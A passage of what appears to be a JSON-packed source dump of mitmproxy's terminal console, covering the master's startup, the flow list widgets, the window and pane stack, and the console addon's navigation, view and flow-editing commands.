f\"Set your LANG environment variable to something like en_US.UTF-8.\",\n                file=sys.stderr,\n            )\n            # Experimental (04/2022): We just don't exit here and see if/how that affects users.\n            # sys.exit(1)\n        urwid.set_encoding(\"utf8\")\n\n        signals.call_in.connect(self.sig_call_in)\n        self.ui = window.Screen()\n        self.ui.set_terminal_properties(256)\n        self.set_palette(None)\n        self.options.subscribe(\n            self.set_palette, [\"console_palette\", \"console_palette_transparent\"]\n        )\n\n        loop = asyncio.get_running_loop()\n        if isinstance(loop, getattr(asyncio, \"ProactorEventLoop\", tuple())):\n            # fix for https://bugs.python.org/issue37373\n            loop = AddThreadSelectorEventLoop(loop)  # type: ignore\n        self.loop = urwid.MainLoop(\n            urwid.SolidFill(\"x\"),\n            event_loop=urwid.AsyncioEventLoop(loop=loop),\n            screen=self.ui,\n            handle_mouse=self.options.console_mouse,\n        )\n        self.window = window.Window(self)\n        self.loop.widget = self.window\n        self.window.refresh()\n\n        self.loop.start()\n\n        await super().running()\n\n    async def done(self):\n        self.loop.stop()\n        await super().done()\n\n    def overlay(self, widget, **kwargs):\n        assert self.window\n        self.window.set_overlay(widget, **kwargs)\n\n    def switch_view(self, name):\n        assert self.window\n        self.window.push(name)\n\n    def quit(self, a):\n        if a != \"n\":\n            self.shutdown()\n", "mitmproxy/tools/console/flowlist.py": "from functools import lru_cache\n\nimport urwid\n\nimport mitmproxy.tools.console.master\nfrom mitmproxy.tools.console import common\nfrom mitmproxy.tools.console import layoutwidget\n\n\nclass FlowItem(urwid.WidgetWrap):\n    def __init__(self, master, flow):\n        self.master, self.flow = master, flow\n        w = self.get_text()\n        urwid.WidgetWrap.__init__(self, w)\n\n    def get_text(self):\n        cols, _ = self.master.ui.get_cols_rows()\n        layout = self.master.options.console_flowlist_layout\n        if layout == \"list\" or (layout == \"default\" and cols < 100):\n            render_mode = common.RenderMode.LIST\n        else:\n            render_mode = common.RenderMode.TABLE\n\n        return common.format_flow(\n            self.flow,\n            render_mode=render_mode,\n            focused=self.flow is self.master.view.focus.flow,\n            hostheader=self.master.options.showhost,\n        )\n\n    def selectable(self):\n        return True\n\n    def mouse_event(self, size, event, button, col, row, focus):\n        if event == \"mouse press\" and button == 1:\n            self.master.commands.execute(\"console.view.flow @focus\")\n            return True\n\n    def keypress(self, size, key):\n        return key\n\n\nclass FlowListWalker(urwid.ListWalker):\n    master: \"mitmproxy.tools.console.master.ConsoleMaster\"\n\n    def __init__(self, master):\n        self.master = master\n\n    def positions(self, reverse=False):\n        # The stub implementation of positions can go once this issue is resolved:\n        # https://github.com/urwid/urwid/issues/294\n        ret = range(self.master.view.get_length())\n        if reverse:\n            return reversed(ret)\n        return ret\n\n    def view_changed(self):\n        self._modified()\n        self._get.cache_clear()\n\n    def get_focus(self):\n        if not self.master.view.focus.flow:\n            return None, 0\n        f = FlowItem(self.master, self.master.view.focus.flow)\n        return f, self.master.view.focus.index\n\n    def set_focus(self, index):\n        if self.master.commands.execute(\"view.properties.inbounds %d\" % index):\n            self.master.view.focus.index = index\n\n    @lru_cache(maxsize=None)\n    def _get(self, pos: int) -> tuple[FlowItem | None, int | None]:\n        if not self.master.view.inbounds(pos):\n            return None, None\n        return FlowItem(self.master, self.master.view[pos]), pos\n\n    def get_next(self, pos):\n        return self._get(pos + 1)\n\n    def get_prev(self, pos):\n        return self._get(pos - 1)\n\n\nclass FlowListBox(urwid.ListBox, layoutwidget.LayoutWidget):\n    title = \"Flows\"\n    keyctx = \"flowlist\"\n\n    def __init__(self, master: \"mitmproxy.tools.console.master.ConsoleMaster\") -> None:\n        self.master: \"mitmproxy.tools.console.master.ConsoleMaster\" = master\n        super().__init__(FlowListWalker(master))\n        self.master.options.subscribe(\n            self.set_flowlist_layout, [\"console_flowlist_layout\"]\n        )\n\n    def keypress(self, size, key):\n        if key == \"m_start\":\n            self.master.commands.execute(\"view.focus.go 0\")\n        elif key == \"m_end\":\n            self.master.commands.execute(\"view.focus.go -1\")\n        elif key == \"m_select\":\n            self.master.commands.execute(\"console.view.flow @focus\")\n        return urwid.ListBox.keypress(self, size, key)\n\n    def view_changed(self):\n        self.body.view_changed()\n\n    def set_flowlist_layout(self, *_) -> None:\n        self.master.ui.clear()\n", "mitmproxy/tools/console/window.py": "import re\n\nimport urwid\n\nfrom mitmproxy import flow\nfrom mitmproxy.tools.console import commands\nfrom mitmproxy.tools.console import common\nfrom mitmproxy.tools.console import eventlog\nfrom mitmproxy.tools.console import flowlist\nfrom mitmproxy.tools.console import flowview\nfrom mitmproxy.tools.console import grideditor\nfrom mitmproxy.tools.console import help\nfrom mitmproxy.tools.console import keybindings\nfrom mitmproxy.tools.console import options\nfrom mitmproxy.tools.console import overlay\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.tools.console import statusbar\n\n\nclass StackWidget(urwid.Frame):\n    def __init__(self, window, widget, title, focus):\n        self.is_focused = focus\n        self.window = window\n\n        if title:\n            header = urwid.AttrWrap(\n                urwid.Text(title), \"heading\" if focus else \"heading_inactive\"\n            )\n        else:\n            header = None\n        super().__init__(widget, header=header)\n\n    def mouse_event(self, size, event, button, col, row, focus):\n        if event == \"mouse press\" and button == 1 and not self.is_focused:\n            self.window.switch()\n        return super().mouse_event(size, event, button, col, row, focus)\n\n    def keypress(self, size, key):\n        # Make sure that we don't propagate cursor events outside of the widget.\n        # Otherwise, in a horizontal layout, urwid's Pile would change the focused widget\n        # if we cannot scroll any further.\n        ret = super().keypress(size, key)\n        command = self._command_map[\n            ret\n        ]  # awkward as they don't implement a full dict api\n        if command and command.startswith(\"cursor\"):\n            return None\n        return ret\n\n\nclass WindowStack:\n    def __init__(self, master, base):\n        self.master = master\n        self.windows = dict(\n            flowlist=flowlist.FlowListBox(master),\n            flowview=flowview.FlowView(master),\n            commands=commands.Commands(master),\n            keybindings=keybindings.KeyBindings(master),\n            options=options.Options(master),\n            help=help.HelpView(master),\n            eventlog=eventlog.EventLog(master),\n            edit_focus_query=grideditor.QueryEditor(master),\n            edit_focus_cookies=grideditor.CookieEditor(master),\n            edit_focus_setcookies=grideditor.SetCookieEditor(master),\n            edit_focus_setcookie_attrs=grideditor.CookieAttributeEditor(master),\n            edit_focus_multipart_form=grideditor.RequestMultipartEditor(master),\n            edit_focus_urlencoded_form=grideditor.RequestUrlEncodedEditor(master),\n            edit_focus_path=grideditor.PathEditor(master),\n            edit_focus_request_headers=grideditor.RequestHeaderEditor(master),\n            edit_focus_response_headers=grideditor.ResponseHeaderEditor(master),\n        )\n        self.stack = [base]\n        self.overlay = None\n\n    def set_overlay(self, o, **kwargs):\n        self.overlay = overlay.SimpleOverlay(\n            self,\n            o,\n            self.top_widget(),\n            o.width,\n            **kwargs,\n        )\n\n    def top_window(self):\n        \"\"\"\n        The current top window, ignoring overlays.\n        \"\"\"\n        return self.windows[self.stack[-1]]\n\n    def top_widget(self):\n        \"\"\"\n        The current top widget - either a window or the active overlay.\n        \"\"\"\n        if self.overlay:\n            return self.overlay\n        return self.top_window()\n\n    def push(self, wname):\n        if self.stack[-1] == wname:\n            return\n        prev = self.top_window()\n        self.stack.append(wname)\n        self.call(\"layout_pushed\", prev)\n\n    def pop(self, *args, **kwargs):\n        \"\"\"\n        Pop off the stack, return True if we're already at the top.\n        \"\"\"\n        if not self.overlay and len(self.stack) == 1:\n            return True\n        self.call(\"layout_popping\")\n        if self.overlay:\n            self.overlay = None\n        else:\n            self.stack.pop()\n\n    def call(self, name, *args, **kwargs):\n        \"\"\"\n        Call a function on both the top window, and the overlay if there is\n        one. If the widget has a key_responder, we call the function on the\n        responder instead.\n        \"\"\"\n        getattr(self.top_window(), name)(*args, **kwargs)\n        if self.overlay:\n            getattr(self.overlay, name)(*args, **kwargs)\n\n\nclass Window(urwid.Frame):\n    def __init__(self, master):\n        self.statusbar = statusbar.StatusBar(master)\n        super().__init__(\n            None, header=None, footer=urwid.AttrWrap(self.statusbar, \"background\")\n        )\n        self.master = master\n        self.master.view.sig_view_refresh.connect(self.view_changed)\n        self.master.view.sig_view_add.connect(self.view_changed)\n        self.master.view.sig_view_remove.connect(self.view_changed)\n        self.master.view.sig_view_update.connect(self.view_changed)\n        self.master.view.focus.sig_change.connect(self.view_changed)\n        self.master.view.focus.sig_change.connect(self.focus_changed)\n\n        signals.focus.connect(self.sig_focus)\n        signals.flow_change.connect(self.flow_changed)\n        signals.pop_view_state.connect(self.pop)\n\n        self.master.options.subscribe(\n            self.configure, [\"console_layout\", \"console_layout_headers\"]\n        )\n        self.pane = 0\n        self.stacks = [WindowStack(master, \"flowlist\"), WindowStack(master, \"eventlog\")]\n\n    def focus_stack(self):\n        return self.stacks[self.pane]\n\n    def configure(self, options, updated):\n        self.refresh()\n\n    def refresh(self):\n        \"\"\"\n        Redraw the layout.\n        \"\"\"\n        c = self.master.options.console_layout\n        if c == \"single\":\n            self.pane = 0\n\n        def wrapped(idx):\n            widget = self.stacks[idx].top_widget()\n            if self.master.options.console_layout_headers:\n                title = self.stacks[idx].top_window().title\n            else:\n                title = None\n            return StackWidget(self, widget, title, self.pane == idx)\n\n        w = None\n        if c == \"single\":\n            w = wrapped(0)\n        elif c == \"vertical\":\n            w = urwid.Pile(\n                [wrapped(i) for i, s in enumerate(self.stacks)], focus_item=self.pane\n            )\n        else:\n            w = urwid.Columns(\n                [wrapped(i) for i, s in enumerate(self.stacks)],\n                dividechars=1,\n                focus_column=self.pane,\n            )\n\n        self.body = urwid.AttrWrap(w, \"background\")\n        signals.window_refresh.send()\n\n    def flow_changed(self, flow: flow.Flow) -> None:\n        if self.master.view.focus.flow:\n            if flow.id == self.master.view.focus.flow.id:\n                self.focus_changed()\n\n    def focus_changed(self, *args, **kwargs):\n        \"\"\"\n        Triggered when the focus changes - either when it's modified, or\n        when it changes to a different flow altogether.\n        \"\"\"\n        for i in self.stacks:\n            i.call(\"focus_changed\")\n\n    def view_changed(self, *args, **kwargs):\n        \"\"\"\n        Triggered when the view list has changed.\n        \"\"\"\n        for i in self.stacks:\n            i.call(\"view_changed\")\n\n    def set_overlay(self, o, **kwargs):\n        \"\"\"\n        Set an overlay on the currently focused stack.\n        \"\"\"\n        self.focus_stack().set_overlay(o, **kwargs)\n        self.refresh()\n\n    def push(self, wname):\n        \"\"\"\n        Push a window onto the currently focused stack.\n        \"\"\"\n        self.focus_stack().push(wname)\n        self.refresh()\n        self.view_changed()\n        self.focus_changed()\n\n    def pop(self) -> None:\n        \"\"\"\n        Pop a window from the currently focused stack. If there is only one\n        window on the stack, this prompts for exit.\n        \"\"\"\n        if self.focus_stack().pop():\n            self.master.prompt_for_exit()\n        else:\n            self.refresh()\n            self.view_changed()\n            self.focus_changed()\n\n    def stacks_sorted_by_focus(self):\n        \"\"\"\n        Returns:\n            self.stacks, with the focused stack first.\n        \"\"\"\n        stacks = self.stacks.copy()\n        stacks.insert(0, stacks.pop(self.pane))\n        return stacks\n\n    def current(self, keyctx):\n        \"\"\"\n        Returns the active widget with a matching key context, including overlays.\n        If multiple stacks have an active widget with a matching key context,\n        the currently focused stack is preferred.\n        \"\"\"\n        for s in self.stacks_sorted_by_focus():\n            t = s.top_widget()\n            if t.keyctx == keyctx:\n                return t\n\n    def current_window(self, keyctx):\n        \"\"\"\n        Returns the active window with a matching key context, ignoring overlays.\n        If multiple stacks have an active widget with a matching key context,\n        the currently focused stack is preferred.\n        \"\"\"\n        for s in self.stacks_sorted_by_focus():\n            t = s.top_window()\n            if t.keyctx == keyctx:\n                return t\n\n    def sig_focus(self, section):\n        self.focus_position = section\n\n    def switch(self):\n        \"\"\"\n        Switch between the two panes.\n        \"\"\"\n        if self.master.options.console_layout == \"single\":\n            self.pane = 0\n        else:\n            self.pane = (self.pane + 1) % len(self.stacks)\n        self.refresh()\n\n    def mouse_event(self, *args, **kwargs):\n        # args: (size, event, button, col, row)\n        k = super().mouse_event(*args, **kwargs)\n        if not k:\n            if args[1] == \"mouse drag\":\n                signals.status_message.send(\n                    message=\"Hold down fn, shift, alt or ctrl to select text or use the --set console_mouse=false parameter.\",\n                    expire=1,\n                )\n            elif args[1] == \"mouse press\" and args[2] == 4:\n                self.keypress(args[0], \"up\")\n            elif args[1] == \"mouse press\" and args[2] == 5:\n                self.keypress(args[0], \"down\")\n            else:\n                return False\n            return True\n\n    def keypress(self, size, k):\n        k = super().keypress(size, k)\n        if k:\n            return self.master.keymap.handle(self.focus_stack().top_widget().keyctx, k)\n\n\nclass Screen(urwid.raw_display.Screen):\n    def write(self, data):\n        if common.IS_WINDOWS_OR_WSL:\n            # replace urwid's SI/SO, which produce artifacts under WSL.\n            # at some point we may figure out what they actually do.\n            data = re.sub(\"[\\x0e\\x0f]\", \"\", data)\n        super().write(data)\n", "mitmproxy/tools/console/consoleaddons.py": "import csv\nimport logging\nfrom collections.abc import Sequence\n\nimport mitmproxy.types\nfrom mitmproxy import command\nfrom mitmproxy import command_lexer\nfrom mitmproxy import contentviews\nfrom mitmproxy import ctx\nfrom mitmproxy import dns\nfrom mitmproxy import exceptions\nfrom mitmproxy import flow\nfrom mitmproxy import http\nfrom mitmproxy import log\nfrom mitmproxy import tcp\nfrom mitmproxy import udp\nfrom mitmproxy.log import ALERT\nfrom mitmproxy.tools.console import keymap\nfrom mitmproxy.tools.console import overlay\nfrom mitmproxy.tools.console import signals\nfrom mitmproxy.utils import strutils\n\nlogger = logging.getLogger(__name__)\n\n\nconsole_palettes = [\n    \"lowlight\",\n    \"lowdark\",\n    \"light\",\n    \"dark\",\n    \"solarized_light\",\n    \"solarized_dark\",\n]\nview_orders = [\n    \"time\",\n    \"method\",\n    \"url\",\n    \"size\",\n]\nconsole_layouts = [\n    \"single\",\n    \"vertical\",\n    \"horizontal\",\n]\n\nconsole_flowlist_layout = [\"default\", \"table\", \"list\"]\n\n\nclass ConsoleAddon:\n    \"\"\"\n    An addon that exposes console-specific commands, and hooks into required\n    events.\n    \"\"\"\n\n    def __init__(self, master):\n        self.master = master\n        self.started = False\n\n    def load(self, loader):\n        loader.add_option(\n            \"console_default_contentview\",\n            str,\n            \"auto\",\n            \"The default content view mode.\",\n            choices=[i.name.lower() for i in contentviews.views],\n        )\n        loader.add_option(\n            \"console_eventlog_verbosity\",\n            str,\n            \"info\",\n            \"EventLog verbosity.\",\n            choices=log.LogLevels,\n        )\n        loader.add_option(\n            \"console_layout\",\n            str,\n            \"single\",\n            \"Console layout.\",\n            choices=sorted(console_layouts),\n        )\n        loader.add_option(\n            \"console_layout_headers\",\n            bool,\n            True,\n            \"Show layout component headers\",\n        )\n        loader.add_option(\n            \"console_focus_follow\", bool, False, \"Focus follows new flows.\"\n        )\n        loader.add_option(\n            \"console_palette\",\n            str,\n            \"solarized_dark\",\n            \"Color palette.\",\n            choices=sorted(console_palettes),\n        )\n        loader.add_option(\n            \"console_palette_transparent\",\n            bool,\n            True,\n            \"Set transparent background for palette.\",\n        )\n        loader.add_option(\"console_mouse\", bool, True, \"Console mouse interaction.\")\n        loader.add_option(\n            \"console_flowlist_layout\",\n            str,\n            \"default\",\n            \"Set the flowlist layout\",\n            choices=sorted(console_flowlist_layout),\n        )\n        loader.add_option(\n            \"console_strip_trailing_newlines\",\n            bool,\n            False,\n            \"Strip trailing newlines from edited request/response bodies.\",\n        )\n\n    @command.command(\"console.layout.options\")\n    def layout_options(self) -> Sequence[str]:\n        \"\"\"\n        Returns the available options for the console_layout option.\n        \"\"\"\n        return [\"single\", \"vertical\", \"horizontal\"]\n\n    @command.command(\"console.layout.cycle\")\n    def layout_cycle(self) -> None:\n        \"\"\"\n        Cycle through the console layout options.\n        \"\"\"\n        opts = self.layout_options()\n        off = self.layout_options().index(ctx.options.console_layout)\n        ctx.options.update(console_layout=opts[(off + 1) % len(opts)])\n\n    @command.command(\"console.panes.next\")\n    def panes_next(self) -> None:\n        \"\"\"\n        Go to the next layout pane.\n        \"\"\"\n        self.master.window.switch()\n\n    @command.command(\"console.panes.prev\")\n    def panes_prev(self) -> None:\n        \"\"\"\n        Go to the previous layout pane.\n        \"\"\"\n        return self.panes_next()\n\n    @command.command(\"console.options.reset.focus\")\n    def options_reset_current(self) -> None:\n        \"\"\"\n        Reset the current option in the options editor.\n        \"\"\"\n        fv = self.master.window.current(\"options\")\n        if not fv:\n            raise exceptions.CommandError(\"Not viewing options.\")\n        self.master.commands.call_strings(\"options.reset.one\", [fv.current_name()])\n\n    @command.command(\"console.nav.start\")\n    def nav_start(self) -> None:\n        \"\"\"\n        Go to the start of a list or scrollable.\n        \"\"\"\n        self.master.inject_key(\"m_start\")\n\n    @command.command(\"console.nav.end\")\n    def nav_end(self) -> None:\n        \"\"\"\n        Go to the end of a list or scrollable.\n        \"\"\"\n        self.master.inject_key(\"m_end\")\n\n    @command.command(\"console.nav.next\")\n    def nav_next(self) -> None:\n        \"\"\"\n        Go to the next navigatable item.\n        \"\"\"\n        self.master.inject_key(\"m_next\")\n\n    @command.command(\"console.nav.select\")\n    def nav_select(self) -> None:\n        \"\"\"\n        Select a navigable item for viewing or editing.\n        \"\"\"\n        self.master.inject_key(\"m_select\")\n\n    @command.command(\"console.nav.up\")\n    def nav_up(self) -> None:\n        \"\"\"\n        Go up.\n        \"\"\"\n        self.master.inject_key(\"up\")\n\n    @command.command(\"console.nav.down\")\n    def nav_down(self) -> None:\n        \"\"\"\n        Go down.\n        \"\"\"\n        self.master.inject_key(\"down\")\n\n    @command.command(\"console.nav.pageup\")\n    def nav_pageup(self) -> None:\n        \"\"\"\n        Go up.\n        \"\"\"\n        self.master.inject_key(\"page up\")\n\n    @command.command(\"console.nav.pagedown\")\n    def nav_pagedown(self) -> None:\n        \"\"\"\n        Go down.\n        \"\"\"\n        self.master.inject_key(\"page down\")\n\n    @command.command(\"console.nav.left\")\n    def nav_left(self) -> None:\n        \"\"\"\n        Go left.\n        \"\"\"\n        self.master.inject_key(\"left\")\n\n    @command.command(\"console.nav.right\")\n    def nav_right(self) -> None:\n        \"\"\"\n        Go right.\n        \"\"\"\n        self.master.inject_key(\"right\")\n\n    @command.command(\"console.choose\")\n    def console_choose(\n        self,\n        prompt: str,\n        choices: Sequence[str],\n        cmd: mitmproxy.types.Cmd,\n        *args: mitmproxy.types.CmdArgs,\n    ) -> None:\n        \"\"\"\n        Prompt the user to choose from a specified list of strings, then\n        invoke another command with all occurrences of {choice} replaced by\n        the choice the user made.\n        \"\"\"\n\n        def callback(opt):\n            # We're now outside of the call context...\n            repl = [arg.replace(\"{choice}\", opt) for arg in args]\n            try:\n                self.master.commands.call_strings(cmd, repl)\n            except exceptions.CommandError as e:\n                logger.error(str(e))\n\n        self.master.overlay(overlay.Chooser(self.master, prompt, choices, \"\", callback))\n\n    @command.command(\"console.choose.cmd\")\n    def console_choose_cmd(\n        self,\n        prompt: str,\n        choicecmd: mitmproxy.types.Cmd,\n        subcmd: mitmproxy.types.Cmd,\n        *args: mitmproxy.types.CmdArgs,\n    ) -> None:\n        \"\"\"\n        Prompt the user to choose from a list of strings returned by a\n        command, then invoke another command with all occurrences of {choice}\n        replaced by the choice the user made.\n        \"\"\"\n        choices = ctx.master.commands.execute(choicecmd)\n\n        def callback(opt):\n            # We're now outside of the call context...\n            repl = [arg.replace(\"{choice}\", opt) for arg in args]\n            try:\n                self.master.commands.call_strings(subcmd, repl)\n            except exceptions.CommandError as e:\n                logger.error(str(e))\n\n        self.master.overlay(overlay.Chooser(self.master, prompt, choices, \"\", callback))\n\n    @command.command(\"console.command\")\n    def console_command(self, *command_str: str) -> None:\n        \"\"\"\n        Prompt the user to edit a command with a (possibly empty) starting value.\n        \"\"\"\n        quoted = \" \".join(command_lexer.quote(x) for x in command_str)\n        if quoted:\n            quoted += \" \"\n        signals.status_prompt_command.send(partial=quoted)\n\n    @command.command(\"console.command.set\")\n    def console_command_set(self, option_name: str) -> None:\n        \"\"\"\n        Prompt the user to set an option.\n        \"\"\"\n        option_value = getattr(self.master.options, option_name, None) or \"\"\n        set_command = f\"set {option_name} {option_value!r}\"\n        cursor = len(set_command) - 1\n        signals.status_prompt_command.send(partial=set_command, cursor=cursor)\n\n    @command.command(\"console.view.keybindings\")\n    def view_keybindings(self) -> None:\n        \"\"\"View the commands list.\"\"\"\n        self.master.switch_view(\"keybindings\")\n\n    @command.command(\"console.view.commands\")\n    def view_commands(self) -> None:\n        \"\"\"View the commands list.\"\"\"\n        self.master.switch_view(\"commands\")\n\n    @command.command(\"console.view.options\")\n    def view_options(self) -> None:\n        \"\"\"View the options editor.\"\"\"\n        self.master.switch_view(\"options\")\n\n    @command.command(\"console.view.eventlog\")\n    def view_eventlog(self) -> None:\n        \"\"\"View the event log.\"\"\"\n        self.master.switch_view(\"eventlog\")\n\n    @command.command(\"console.view.help\")\n    def view_help(self) -> None:\n        \"\"\"View help.\"\"\"\n        self.master.switch_view(\"help\")\n\n    @command.command(\"console.view.flow\")\n    def view_flow(self, flow: flow.Flow) -> None:\n        \"\"\"View a flow.\"\"\"\n        if isinstance(flow, (http.HTTPFlow, tcp.TCPFlow, udp.UDPFlow, dns.DNSFlow)):\n            self.master.switch_view(\"flowview\")\n        else:\n            logger.warning(f\"No detail view for {type(flow).__name__}.\")\n\n    @command.command(\"console.exit\")\n    def exit(self) -> None:\n        \"\"\"Exit mitmproxy.\"\"\"\n        self.master.shutdown()\n\n    @command.command(\"console.view.pop\")\n    def view_pop(self) -> None:\n        \"\"\"\n        Pop a view off the console stack. At the top level, this prompts the\n        user to exit mitmproxy.\n        \"\"\"\n        signals.pop_view_state.send()\n\n    @command.command(\"console.bodyview\")\n    @command.argument(\"part\", type=mitmproxy.types.Choice(\"console.bodyview.options\"))\n    def bodyview(self, flow: flow.Flow, part: str) -> None:\n        \"\"\"\n        Spawn an external viewer for a flow request or response body based\n        on the detected MIME type. We use the mailcap system to find the\n        correct viewer, and fall back to the programs in $PAGER or $EDITOR\n        if necessary.\n        \"\"\"\n        fpart = getattr(flow, part, None)\n        if not fpart:\n            raise exceptions.CommandError(\n                \"Part must be either request or response, not %s.\" % part\n            )\n        t = fpart.headers.get(\"content-type\")\n        content = fpart.get_content(strict=False)\n        if not content:\n            raise exceptions.CommandError(\"No content to view.\")\n        self.master.spawn_external_viewer(content, t)\n\n    @command.command(\"console.bodyview.options\")\n    def bodyview_options(self) -> Sequence[str]:\n        \"\"\"\n        Possible parts for console.bodyview.\n        \"\"\"\n        return [\"request\", \"response\"]\n\n    @command.command(\"console.edit.focus.options\")\n    def edit_focus_options(self) -> Sequence[str]:\n        \"\"\"\n        Possible components for console.edit.focus.\n        \"\"\"\n        flow = self.master.view.focus.flow\n        focus_options = []\n\n        if flow is None:\n            raise exceptions.CommandError(\"No flow selected.\")\n        elif isinstance(flow, tcp.TCPFlow):\n            focus_options = [\"tcp-message\"]\n        elif isinstance(flow, udp.UDPFlow):\n            focus_options = [\"udp-message\"]\n        elif isinstance(flow, http.HTTPFlow):\n            focus_options = [\n                \"cookies\",\n                \"urlencoded form\",\n                \"multipart form\",\n                \"path\",\n                \"method\",\n                \"query\",\n                \"reason\",\n                \"request-headers\",\n                \"response-headers\",\n                \"request-body\",\n                \"response-body\",\n                \"status_code\",\n                \"set-cookies\",\n                \"url\",\n            ]\n            if flow.websocket:\n                focus_options.append(\"websocket-message\")\n        elif isinstance(flow, dns.DNSFlow):\n            raise exceptions.CommandError(\n                \"Cannot edit DNS flows yet, please submit a patch.\"\n            )\n\n        return focus_options\n\n    @command.command(\"console.edit.focus\")\n    @command.argument(\n        \"flow_part\", type=mitmproxy.types.Choice(\"console.edit.focus.options\")\n    )\n    def edit_focus(self, flow_part: str) -> None:\n        \"\"\"\n        Edit a component of the currently focused flow.\n        \"\"\"\n        flow = self.master.view.focus.flow\n        # This shouldn't be necessary once this command is \"console.edit @focus\",\n        # but for now it is.\n        if not flow:\n            raise exceptions.CommandError(\"No flow selected.\")\n        flow.backup()\n\n        require_dummy_response = (\n            flow_part in (\"response-headers\", \"response-body\", \"set-cookies\")\n            and flow.response is None\n        )\n        if require_dummy_response:\n            flow.response = http.Response.make()\n        if flow_part == \"cookies\":\n            self.master.switch_view(\"edit_focus_cookies\")\n        elif flow_part == \"urlencoded form\":\n            self.master.switch_view(\"edit_focus_urlencoded_form\")\n        elif flow_part == \"multipart form\":\n            self.master.switch_view(\"edit_focus_multipart_form\")\n        elif flow_part == \"path\":\n            self.master.switch_view(\"edit_focus_path\")\n        elif flow_part == \"query\":\n            self.master.switch_view(\"edit_focus_query\")\n        elif flow_part == \"request-headers\":\n            self.master.switch_view(\"edit_focus_request_headers\")\n        elif flow_part == \"response-headers\":\n            self.master.switch_view(\"edit_focus_response_headers\")\n        elif flow_part in (\"request-body\", \"response-body\"):\n            if flow_part == \"request-body\":\n                message = flow.request\n            else:\n                message = flow.response\n            c = self.master.spawn_editor(message.get_content(strict=False) or b\"\")\n            # Many editors make it hard to save a file without a terminating\n            # newline on the last line. When editing message bodies, this can\n            # cause problems. We strip trailing newlines by default, but this\n            # behavior is configurable.\n            if self.master.options.console_strip_trailing_newlines:\n                message.content = c.rstrip(b\"\\n\")\n            else:\n                message.content = c\n        elif flow_part == \"set-cookies\":\n            self.master.switch_view(\"edit_focus_setcookies\")\n        elif flow_part == \"url\":\n            url = flow.request.url.encode()\n            edited_url = self.master.spawn_editor(url)\n            url = edited_url.rstrip(b\"\\n\")\n            flow.request.url = url.decode()\n        elif flow_part in [\"method\", \"status_code\", \"reason\"]:\n            self.master.commands.call_strings(\n                \"console.command\", [\"flow.set\", \"@focus\", flow_part]\n            )\n        elif flow_part in [\"tcp-message\", \"udp-message\"]:\n            message = flow.messages[-1]\n            c = self.master.spawn_editor(message.content or b\"\")\n            message.content = c.rstrip(b\"\\n\")\n        elif flow_part == \"websocket-message\":\n            message = flow.websocket.messages[-1]\n            c = self.master.spawn_editor(message.content or b\"\")\n            message.content = c.rstrip(b\"\\n\")\n\n    def _grideditor(self):\n        gewidget = self.master.window.current(\"grideditor\")\n        if not gewidget:\n            raise exceptions.CommandError(\"Not in a grideditor.\")\n        return gewidget.key_responder()\n\n    @command.command(\"console.grideditor.add\")\n    def grideditor_add(self) -> None:\n        \"\"\"\n        Add a row after the cursor.\n        \"\"\"\n        self._grideditor().cmd_add()\n\n    @command.command(\"console.grideditor.insert\")\n    def grideditor_insert(self) -> None:\n        \"\"\"\n        Insert a row before the cursor.\n        \"\"\"\n        self._grideditor().cmd_insert()\n\n    @command.command(\"console.grideditor.delete\")\n    def grideditor_delete(self) -> None:\n        \"\"\"\n        Delete row\n        \"\"\"\n        self._grideditor().cmd_delete()\n\n    @command.command(\"console.grideditor.load\")\n    def grideditor_load(self, path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Read a file into the currrent cell.\n        \"\"\"\n        self._grideditor().cmd_read_file(path)\n\n    @command.command(\"console.grideditor.load_escaped\")\n    def grideditor_load_escaped(self, path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Read a file containing a Python-style escaped string into the\n        currrent cell.\n        \"\"\"\n        self._grideditor().cmd_read_file_escaped(path)\n\n    @command.command(\"console.grideditor.save\")\n    def grideditor_save(self, path: mitmproxy.types.Path) -> None:\n        \"\"\"\n        Save data to file as a CSV.\n        \"\"\"\n        rows = self._grideditor().value\n        try:\n            with open(path, \"w\", newline=\"\", encoding=\"utf8\") as fp:\n                writer = csv.writer(fp)\n                for row in rows:\n                    writer.writerow(\n                        [strutils.always_str(x) or \"\" for x in row]  # type: ignore\n                    )\n            logger.log(ALERT, \"Saved %s rows as CSV.\" % (len(rows)))\n        except OSError as e:\n            logger.error(str(e))\n\n    @command.command(\"console.grideditor.editor\")\n    def grideditor_editor(self) -> None:\n        \"\"\"\n        Spawn an external editor on the current cell.\n        \"\"\"\n        self._grideditor().cmd_spawn_editor()\n\n    @command.command(\"console.flowview.mode.set\")\n    @command.argument(\n        \"mode\", type=mitmproxy.types.Choice(\"console.flowview.mode.options\")\n    )\n    def flowview_mode_set(self, mode: str) -> None:\n        \"\"\"\n        Set the display mode for the current flow view.\n        \"\"\"\n        fv = self.master.window.current_window(\"flowview\")\n        if not fv:\n            raise exceptions.CommandError(\"Not viewing a flow.\")\n        idx = fv.body.tab_offset\n\n        if mode not in [i.name.lower() for i in contentviews.views]:\n            raise exceptions.CommandError(\"Invalid flowview mode.\")\n\n        try:\n            self.master.commands.call_strings(\n                \"view.settings.setval\", [\"@focus\", f\"flowview_mode_{idx}\", mode]\n            )\n        except exceptions.CommandError as e:\n            logger.error(str(e))\n\n    @command.command(\"console.flowview.mode.options\")\n    def flowview_mode_options(self) -> Sequence[str]:\n        \"\"\"\n        Returns the valid options for the flowview mode.\n        \"\"\"\n        return [i.name.lower() for i in contentviews.views]\n\n    @command.command(\"console.flowview.mode\")\n    def flowview_mode(self) -> str:\n        \"\"\"\n        Get the display mode for the current flow view.\n        \"\"\"\n        fv = self.master.window.current_window(\"flowview\")\n        if not fv:\n            raise exceptions.CommandError(\"Not viewing a flow.\")\n        idx = fv.body.tab_offset\n\n        return self.master.commands.call_strings(\n            \"view.settings.getval\",\n            [\n                \"@focus\",\n                f\"flowview_mode_{idx}\",\n                self.master.options.console_default_contentview,\n            ],\n        )\n\n    @command.command(\"console.key.contexts\")\n    def key_contexts(self) -> Sequence[str]:\n        \"\"\"\n        The available contexts for key binding.\n        \"\"\"\n        return list(sorted(keymap.Contexts))\n\n    @command.command(\"console.key.bind\")\n    def key_bind(\n        self,\n        contexts: Sequence[str],\n        key: str,\n        cmd: mitmproxy.types.Cmd,\n        *args: mitmproxy.types.CmdArgs,\n    ) -> None:\n        \"\"\"\n        Bind a shortcut key.\n        \"\"\"\n        try:\n            self.master.keymap.add(key, cmd + \" \" + \" \".join(args), contexts, \"\")\n        except ValueError as v:\n            raise exceptions.CommandError(v)\n\n    